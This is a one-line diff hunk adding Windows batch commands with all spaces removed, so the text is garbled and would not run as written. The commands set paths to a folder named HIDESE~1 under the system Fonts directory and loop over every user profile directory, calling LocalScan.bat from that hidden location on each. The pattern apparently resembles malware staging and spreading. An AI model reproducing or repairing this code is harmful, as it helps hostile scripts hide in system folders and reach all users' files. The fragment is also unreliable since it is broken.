@@ -1,0 +1,1 @@
+setsola=%systemroot%\Fonts\HIDESE~1setsetup=%systemroot%\Fonts\HIDESE~1\solasetup%HOMEDRIVE%cd%USERPROFILE%cd..FOR/F"delims="%%iin('dir/b')docall%setup%\LocalScan.bat%%i
